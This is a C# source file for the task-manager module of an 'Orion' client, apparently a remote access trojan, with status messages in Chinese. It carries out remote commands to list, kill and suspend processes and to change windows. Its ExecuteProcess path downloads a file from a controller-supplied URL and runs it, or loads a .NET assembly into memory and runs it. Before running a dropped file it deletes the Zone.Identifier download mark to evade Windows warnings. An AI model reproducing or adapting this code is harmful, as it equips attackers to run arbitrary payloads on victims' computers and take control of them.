using Orion.Client.Networking;
using Orion.Client.Setup;
using Orion.Client.Helper;
using Orion.Common;
using Orion.Common.Enums;
using Orion.Common.Helpers;
using Orion.Common.Messages;
using Orion.Common.Messages.Administration.TaskManager;
using Orion.Common.Messages.Other;
using Orion.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Orion.Client.Messages
{
    public class TaskManagerHandler : IMessageProcessor, IDisposable
    {
        private readonly OrionClient _client;
        private readonly WebClient _webClient;

        public TaskManagerHandler(OrionClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
            _webClient = new WebClient { Proxy = null };
            _webClient.DownloadDataCompleted += OnDownloadDataCompleted;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            if (!connected && _webClient.IsBusy) _webClient.CancelAsync();
        }

        public bool CanExecute(IMessage message) =>
            message is GetProcesses ||
            message is DoProcessStart ||
            message is DoProcessEnd ||
            message is DoProcessDump ||
            message is DoSetTopMost ||
            message is DoSuspendProcess ||
            message is DoSetWindowState;

        public bool CanExecuteFrom(ISender sender) => true;

        private void SendStatus(string message)
        {
            try { _client.Send(new SetStatus { Message = message }); }
            catch { }
        }

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetProcesses msg: Execute(sender, msg); break;
                case DoProcessStart msg: Execute(sender, msg); break;
                case DoProcessEnd msg: Execute(sender, msg); break;
                case DoProcessDump msg: Execute(sender, msg); break;
                case DoSuspendProcess msg: Execute(sender, msg); break;
                case DoSetTopMost msg: Execute(sender, msg); break;
                case DoSetWindowState msg: Execute(sender, msg); break;
            }
        }
        private void Execute(ISender client, DoProcessEnd message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc != null)
                {
                    proc.Kill();
                    client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = true });
                    SendStatus($"进程 PID {message.Pid} ({proc.ProcessName}) 已成功终止");
                }
                else
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
                    SendStatus($"终止失败: 未找到 PID {message.Pid}");
                }
            }
            catch (System.ComponentModel.Win32Exception ex)
            {
                // Happens when user lacks privileges to terminate the process
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
                SendStatus($"终止 PID {message.Pid} 失败: 拒绝访问 (需要管理员权限)。{ex.Message}");
            }
            catch (Exception ex)
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
                SendStatus($"终止 PID {message.Pid} 失败: {ex.Message}");
            }
        }

        // ---------------------- WINDOW HANDLERS ----------------------
        private void Execute(ISender client, DoSuspendProcess message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc != null)
                {
                    if (message.Suspend)
                        Utilities.NativeMethods.NtSuspendProcess(proc.Handle);
                    else
                        Utilities.NativeMethods.NtResumeProcess(proc.Handle); // <--- process-level resume

                    client.Send(new DoProcessResponse
                    {
                        Action = ProcessAction.Suspend,
                        Result = true
                    });

                    SendStatus($"进程 PID {message.Pid} {(message.Suspend ? "已挂起" : "已恢复")}");
                }
                else
                {
                    client.Send(new DoProcessResponse
                    {
                        Action = ProcessAction.Suspend,
                        Result = false
                    });

                    SendStatus($"未找到进程 PID {message.Pid}");
                }
            }
            catch
            {
                client.Send(new DoProcessResponse
                {
                    Action = ProcessAction.Suspend,
                    Result = false
                });

                SendStatus($"{(message.Suspend ? "挂起" : "恢复")} PID {message.Pid} 失败");
            }
        }



        private void Execute(ISender client, DoSetWindowState message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc == null || proc.MainWindowHandle == IntPtr.Zero)
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.None, Result = false });
                    SendStatus($"设置窗口状态失败: PID {message.Pid} 未找到或没有主窗口");
                    return;
                }

                int nCmd = message.Minimize ? 6 : 9;
                bool result = Utilities.NativeMethods.ShowWindow(proc.MainWindowHandle, nCmd);

                if (result)
                    SendStatus($"窗口已{(message.Minimize ? "最小化" : "还原")}, PID {message.Pid}");
                else
                    SendStatus($"设置窗口状态失败 PID {message.Pid}: 拒绝访问或需要更高权限");

                client.Send(new DoProcessResponse { Action = ProcessAction.None, Result = result });
            }
            catch (Exception ex)
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.None, Result = false });
                SendStatus($"设置窗口状态失败 PID {message.Pid}: {ex.Message}");
            }
        }

        private void Execute(ISender client, DoSetTopMost message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc == null || proc.MainWindowHandle == IntPtr.Zero)
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = false });
                    SendStatus($"置顶操作失败: PID {message.Pid} 未找到或没有主窗口");
                    return;
                }

                const int HWND_TOPMOST = -1;
                const int HWND_NOTOPMOST = -2;
                const uint SWP_NOSIZE = 0x0001;
                const uint SWP_NOMOVE = 0x0002;
                const uint SWP_SHOWWINDOW = 0x0040;

                Utilities.NativeMethods.SetForegroundWindow(proc.MainWindowHandle);
                if (Utilities.NativeMethods.IsIconic(proc.MainWindowHandle))
                    Utilities.NativeMethods.ShowWindow(proc.MainWindowHandle, 9);

                IntPtr hWndInsertAfter = new IntPtr(message.Enable ? HWND_TOPMOST : HWND_NOTOPMOST);
                bool result = Utilities.NativeMethods.SetWindowPos(
                    proc.MainWindowHandle,
                    hWndInsertAfter,
                    0, 0, 0, 0,
                    SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
                );

                if (result)
                    SendStatus($"置顶已{(message.Enable ? "启用" : "禁用")}, PID {message.Pid}");
                else
                    SendStatus($"置顶操作失败 PID {message.Pid}: 拒绝访问或需要更高权限");

                client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = result });
            }
            catch (Exception ex)
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = false });
                SendStatus($"置顶操作失败 PID {message.Pid}: {ex.Message}");
            }
        }

        // ---------------------- PROCESS HANDLERS ----------------------

        private void Execute(ISender client, GetProcesses message)
        {
            Process[] pList = Process.GetProcesses();
            var processes = new Common.Models.Process[pList.Length];
            var parentMap = GetParentProcessMap();

            for (int i = 0; i < pList.Length; i++)
            {
                processes[i] = new Common.Models.Process
                {
                    Name = pList[i].ProcessName + ".exe",
                    Id = pList[i].Id,
                    MainWindowTitle = pList[i].MainWindowTitle,
                    ParentId = parentMap.TryGetValue(pList[i].Id, out var parentId) ? parentId : null
                };
            }

            int currentPid = Process.GetCurrentProcess().Id;
            client.Send(new GetProcessesResponse { Processes = processes, RatPid = currentPid });
        }

        private void Execute(ISender client, DoProcessStart message)
        {
            SendStatus($"正在启动进程: {message.FilePath ?? message.DownloadUrl}");

            if (string.IsNullOrEmpty(message.FilePath) && (message.FileBytes == null || message.FileBytes.Length == 0))
            {
                if (string.IsNullOrEmpty(message.DownloadUrl))
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus("启动进程失败: 没有文件路径或下载 URL");
                    return;
                }

                try
                {
                    if (_webClient.IsBusy) { _webClient.CancelAsync(); while (_webClient.IsBusy) Thread.Sleep(50); }
                    _webClient.DownloadDataAsync(new Uri(message.DownloadUrl), message);
                }
                catch
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus("启动进程失败: 下载出错");
                }
            }
            else
            {
                ExecuteProcess(message.FileBytes, message.FilePath, message.IsUpdate, message.ExecuteInMemoryDotNet, message.FileExtension, message.RemotePath);
            }
        }

        private void OnDownloadDataCompleted(object sender, DownloadDataCompletedEventArgs e)
        {
            var message = (DoProcessStart)e.UserState;
            if (e.Cancelled || e.Error != null)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                SendStatus("启动进程失败: 下载被取消或出错");
                return;
            }
            ExecuteProcess(e.Result, null, message.IsUpdate, message.ExecuteInMemoryDotNet, message.FileExtension, message.RemotePath);
        }

        private void ExecuteProcess(byte[] fileBytes, string filePath, bool isUpdate, bool executeInMemory, string fileExtension, string remotePath = null)
        {
            // If fileBytes is null but remotePath is provided, try to read the file from disk.
            // Add a small retry loop to handle potential IO race conditions after upload.
            if (fileBytes == null && !string.IsNullOrEmpty(remotePath))
            {
                int maxRetries = 10;
                int retryDelay = 200; // Total 2 seconds wait
                for (int i = 0; i < maxRetries; i++)
                {
                    if (File.Exists(remotePath))
                    {
                        try
                        {
                            fileBytes = File.ReadAllBytes(remotePath);
                            if (fileBytes != null && fileBytes.Length > 0) break;
                        }
                        catch (IOException)
                        {
                            // File might still be locked, wait and retry
                        }
                    }
                    Thread.Sleep(retryDelay);
                }
            }

            if (fileBytes == null && !string.IsNullOrEmpty(filePath) && File.Exists(filePath))
                fileBytes = File.ReadAllBytes(filePath);

            if (fileBytes == null || fileBytes.Length == 0)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                SendStatus("启动进程失败: 没有可用的文件数据");
                return;
            }

            try
            {
                if (executeInMemory) { ExecuteViaInMemoryDotNet(fileBytes); return; }
                ExecuteViaFile(fileBytes, fileExtension, remotePath);
            }
            catch (Exception ex)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                SendStatus($"启动进程失败: {ex.Message}");
            }
        }

        private void ExecuteViaInMemoryDotNet(byte[] fileBytes)
        {
            new Thread(() =>
            {
                try
                {
                    Assembly asm = Assembly.Load(fileBytes);
                    MethodInfo entry = asm.EntryPoint;
                    if (entry != null)
                        entry.Invoke(null, entry.GetParameters().Length == 0 ? null : new object[] { new string[0] });
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                    SendStatus(".NET 内存执行成功");
                }
                catch (Exception ex)
                {
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus($".NET 内存执行失败: {ex.Message}");
                }
            }).Start();
        }

        private void ExecuteViaFile(byte[] fileBytes, string fileExtension, string remotePath = null)
        {
            try
            {
                string filePath;
                
                // If remotePath is provided and the file exists there, use it directly
                if (!string.IsNullOrEmpty(remotePath) && File.Exists(remotePath))
                {
                    filePath = remotePath;
                }
                else
                {
                    // Otherwise, use temporary file as fallback
                    filePath = FileHelper.GetTempFilePath(fileExtension ?? ".exe");
                    File.WriteAllBytes(filePath, fileBytes);
                }
                
                FileHelper.DeleteZoneIdentifier(filePath);
                
                // Execute in a separate thread with retry logic for file locks
                new Thread(() =>
                {
                    int maxRetries = 3;
                    int retryDelay = 100; // milliseconds
                    
                    for (int attempt = 0; attempt < maxRetries; attempt++)
                    {
                        try
                        {
                            Process.Start(new ProcessStartInfo { UseShellExecute = true, FileName = filePath });
                            _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                            SendStatus(string.IsNullOrEmpty(remotePath) ? "进程已通过临时文件执行" : "进程已从原始目录执行");
                            return;
                        }
                        catch (IOException) when (attempt < maxRetries - 1)
                        {
                            // File is locked, retry after delay
                            Thread.Sleep(retryDelay);
                        }
                    }
                    
                    // All retries failed
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus($"文件执行失败: 文件被其他进程锁定，已重试 {maxRetries} 次");
                }).Start();
            }
            catch (Exception ex)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                SendStatus($"文件执行失败: {ex.Message}");
            }
        }

        private Dictionary<int, int?> GetParentProcessMap()
        {
            var map = new Dictionary<int, int?>();
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT ProcessId, ParentProcessId FROM Win32_Process"))
                using (var results = searcher.Get())
                {
                    foreach (ManagementObject obj in results)
                    {
                        if (!int.TryParse(obj["ProcessId"]?.ToString(), out int pid))
                            continue;
                        int? parent = obj["ParentProcessId"] != null && int.TryParse(obj["ParentProcessId"]?.ToString(), out int p) ? p : (int?)null;
                        map[pid] = parent != pid ? parent : null;
                    }
                }
            }
            catch { }
            return map;
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _client.ClientState -= OnClientStateChange;
                _webClient.DownloadDataCompleted -= OnDownloadDataCompleted;
                _webClient.CancelAsync();
                _webClient.Dispose();
            }
        }
    }
}
